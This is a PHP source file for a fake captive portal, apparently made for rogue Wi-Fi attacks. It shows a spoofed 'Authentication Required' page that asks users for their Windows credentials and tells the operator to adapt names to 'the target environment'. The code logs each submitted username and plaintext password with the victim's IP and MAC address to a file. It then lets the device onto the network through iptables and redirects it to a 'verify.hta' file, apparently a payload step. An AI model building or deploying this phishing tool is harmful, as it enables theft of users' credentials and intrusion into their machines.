<html>

<style>
#content{border:3px solid#aaa;background-color:#fff;margin:40;padding:40;font-family:Tahoma,Helvetica,Arial,sans-serif;font-size:12px;}
h1{font-size:20px;font-weight:bold;color:#009933;}
b{font-weight:bold;color:#009933;}
</style>
</head>





<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>

<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "access";
$domain_name = "company.local";
$site_name = "Company Web Access Portal:";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
//if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
//  header("location:http://$server_name.$domain_name/index.php?add="
//    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
//  exit;
//}
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>

<body bgcolor="#e7e8e9">
<div id="content">
<h1>Authentication Required</h1>
<p>The following error was encountered while trying to retrieve the URL request. To access the Internet, please logon using your Windows Credentials.
<p>
<p>
Thank you for your understanding in keeping Northwest secure!</p>
<form method="post">
<p><b>Username:</b> <input name="user" type="text"></p>
<p><b>Password:</b><input name="pass" type="password"></p>
<p><input name="submit" value="Submit" type="submit"></p>
<P>
</form>
</div>


  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
 
    global $user;
    global $pass;
    global $mac;
    global $users;
 

    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);

header("Location: verify.hta");

//    sleep(1);
//    header("location:http://".$_GET['add']);
    exit;
}

// Function to print page header
function print_header() {

  ?>



<head>
<title>ACCESS TO THIS SITE HAS BEEN BLOCKED</title>
</head>

  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>


